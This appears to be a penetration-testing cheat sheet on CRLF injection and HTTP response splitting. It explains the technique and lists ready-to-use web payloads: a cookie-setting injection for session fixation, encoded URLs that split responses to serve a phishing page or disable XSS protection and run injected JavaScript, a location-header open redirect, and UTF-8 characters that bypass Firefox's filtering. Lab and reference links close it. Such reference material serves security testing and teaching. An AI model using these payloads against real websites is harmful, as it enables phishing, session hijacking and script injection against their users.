# carriage return line feed

> crlf injection is a web security vulnerability that arises when an attacker injects unexpected carriage return (cr) (\r) and line feed (lf) (\n) characters into an application. these characters are used to signify the end of a line and the start of a new one in network protocols like http, smtp, and others. in the http protocol, the cr-lf sequence is always used to terminate a line.

## summary

* [methodology](#methodology)
    * [session fixation](#session-fixation)
    * [cross site scripting](#cross-site-scripting)
    * [open redirect](#open-redirect)
* [filter bypass](#filter-bypass)
* [labs](#labs)
* [references](#references)


## methodology

http response splitting is a security vulnerability where an attacker manipulates an http response by injecting carriage return (cr) and line feed (lf) characters (collectively called crlf) into a response header. these characters mark the end of a header and the start of a new line in http responses.

**crlf characters**:

* `cr` (`\r`, ascii 13): moves the cursor to the beginning of the line.
* `lf` (`\n`, ascii 10): moves the cursor to the next line.

by injecting a crlf sequence, the attacker can break the response into two parts, effectively controlling the structure of the http response. this can result in various security issues, such as:

* cross-site scripting (xss): injecting malicious scripts into the second response.
* cache poisoning: forcing incorrect content to be stored in caches.
* header manipulation: altering headers to mislead users or systems


### session fixation

a typical http response header looks like this:

```http
http/1.1 200 ok
content-type: text/html
set-cookie: sessionid=abc123
```

if user input `value\r\nset-cookie: admin=true` is embedded into the headers without sanitization:

```http
http/1.1 200 ok
content-type: text/html
set-cookie: sessionid=value
set-cookie: admin=true
```

now the attacker has set their own cookie.


### cross site scripting

beside the session fixation that requires a very insecure way of handling user session, the easiest way to exploit a crlf injection is to write a new body for the page. it can be used to create a phishing page or to trigger an arbitrary javascript code (xss).

**requested page**

```http
http://www.example.net/index.php?lang=en%0d%0acontent-length%3a%200%0a%20%0ahttp/1.1%20200%20ok%0acontent-type%3a%20text/html%0alast-modified%3a%20mon%2c%2027%20oct%202060%2014%3a50%3a18%20gmt%0acontent-length%3a%2034%0a%20%0a%3chtml%3eyou%20have%20been%20phished%3c/html%3e
```

**http response**

```http
set-cookie:en
content-length: 0

http/1.1 200 ok
content-type: text/html
last-modified: mon, 27 oct 2060 14:50:18 gmt
content-length: 34

<html>you have been phished</html>
```

in the case of an xss, the crlf injection allows to inject the `x-xss-protection` header with the value value "0", to disable it. and then we can add our html tag containing javascript code .

**requested page**

```powershell
http://example.com/%0d%0acontent-length:35%0d%0ax-xss-protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```

**http response**

```http
http/1.1 200 ok
date: tue, 20 dec 2016 14:34:03 gmt
content-type: text/html; charset=utf-8
content-length: 22907
connection: close
x-frame-options: sameorigin
last-modified: tue, 20 dec 2016 11:50:50 gmt
etag: "842fe-597b-54415a5c97a80"
vary: accept-encoding
x-ua-compatible: ie=edge
server: netdna-cache/2.2
link: <https://example.com/[injection starts here]
content-length:35
x-xss-protection:0

23
<svg onload=alert(document.domain)>
0
```

### open redirect

inject a `location` header to force a redirect for the user.

```ps1
%0d%0alocation:%20http://myweb.com
```


## filter bypass

[rfc 7230](https://datatracker.ietf.org/doc/html/rfc7230#section-3.2.4) states that most http header field values use only a subset of the us-ascii charset. 

> newly defined header fields should limit their field values to us-ascii octets.

firefox followed the spec by stripping off any out-of-range characters when setting cookies instead of encoding them.

| utf-8 character | hex | unicode | stripped |
| --------- | --- | ------- | -------- |
| `嘊` | `%e5%98%8a` | `\u560a` | `%0a` (\n) |
| `嘍` | `%e5%98%8d` | `\u560d` | `%0d` (\r) |
| `嘾` | `%e5%98%be` | `\u563e` | `%3e` (>)  |
| `嘼` | `%e5%98%bc` | `\u563c` | `%3c` (<)  |

the utf-8 character `嘊` contains `0a` in the last part of its hex format, which would be converted as `\n` by firefox.


an example payload using utf-8 characters would be:

```js
嘊嘍content-type:text/html嘊嘍location:嘊嘍嘊嘍嘼svg/onload=alert(document.domain()嘾
```

url encoded version

```js
%e5%98%8a%e5%98%8dcontent-type:text/html%e5%98%8a%e5%98%8dlocation:%e5%98%8a%e5%98%8d%e5%98%8a%e5%98%8d%e5%98%bcsvg/onload=alert%28document.domain%28%29%e5%98%be
```


## labs

* [portswigger - http/2 request splitting via crlf injection](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection)
* [root me - crlf](https://www.root-me.org/en/challenges/web-server/crlf)


## references

- [crlf injection - cwe-93 - owasp - may 20, 2022](https://www.owasp.org/index.php/crlf_injection)
- [crlf injection on twitter or why blacklists fail - xss jigsaw - april 21, 2015](https://web.archive.org/web/20150425024348/https://blog.innerht.ml/twitter-crlf-injection/)
- [starbucks: [newscdn.starbucks.com] crlf injection, xss - bobrov - december 20, 2016](https://vulners.com/hackerone/h1:192749)